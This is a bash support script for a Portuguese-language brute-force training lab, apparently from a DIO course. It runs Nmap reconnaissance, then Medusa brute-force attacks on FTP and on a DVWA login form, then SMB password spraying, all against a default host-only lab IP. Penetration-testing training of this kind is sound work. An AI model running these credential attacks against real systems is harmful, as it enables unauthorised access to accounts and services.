#!/usr/bin/env bash
#
# run_lab.sh
# Script de apoio para o laboratório de forca bruta (DIO - Kali + Medusa).
# Uso exclusivamente educacional, em ambiente isolado (rede host-only).
#
# Ajuste o IP do alvo conforme sua rede host-only antes de executar.

set -e

TARGET="${1:-192.168.56.20}"
WORDLIST_DIR="$(dirname "$0")/../wordlists"

echo "=== [1/4] Reconhecimento com Nmap ==="
nmap -sV -p 21,22,80,139,445,3306 "$TARGET"

echo ""
echo "=== [2/4] Forca bruta FTP ==="
medusa -h "$TARGET" \
       -U "$WORDLIST_DIR/usuarios.txt" \
       -P "$WORDLIST_DIR/senhas.txt" \
       -M ftp -t 4

echo ""
echo "=== [3/4] Forca bruta no login web (DVWA) ==="
echo "Ajuste o DENY_SIGNAL conforme a mensagem de erro real exibida pelo DVWA."
medusa -h "$TARGET" \
       -U "$WORDLIST_DIR/usuarios.txt" \
       -P "$WORDLIST_DIR/senhas.txt" \
       -M http \
       -m DIR:/dvwa/login.php \
       -m FORM:"username=^USER^&password=^PASS^&Login=Login" \
       -m DENY_SIGNAL:"Login failed" \
       -t 4

echo ""
echo "=== [4/4] Password spraying SMB ==="
medusa -h "$TARGET" \
       -U "$WORDLIST_DIR/usuarios_smb.txt" \
       -p "123456" \
       -M smbnt -t 4

echo ""
echo "Laboratorio concluido. Revise os resultados acima e documente no README.md."
